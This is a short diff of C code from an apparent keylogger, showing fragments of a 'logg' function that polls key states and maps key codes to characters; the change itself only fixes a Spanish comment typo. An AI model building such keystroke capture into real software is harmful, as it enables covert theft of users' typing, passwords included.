@@ -1,3 +1,4 @@
+
 DWORD WINAPI logg(){
     int vkey, last_key_state[0xff];
     int isCAPSLOCK,IsNUNLOCK;
@@ -40,7 +41,7 @@ DWORD WINAPI logg(){
                         showKey=(char)(vkey=0x20);
                     }
                 }
-                //para mu, chars
+                //para num, chars
                 else if(vkey>=0x30 && vkey<=0x30){
                     if(isL_SHIFT==1 || IsR_SHIFT==1){
                         showKey=NUNCHAR[vkey-0x30];
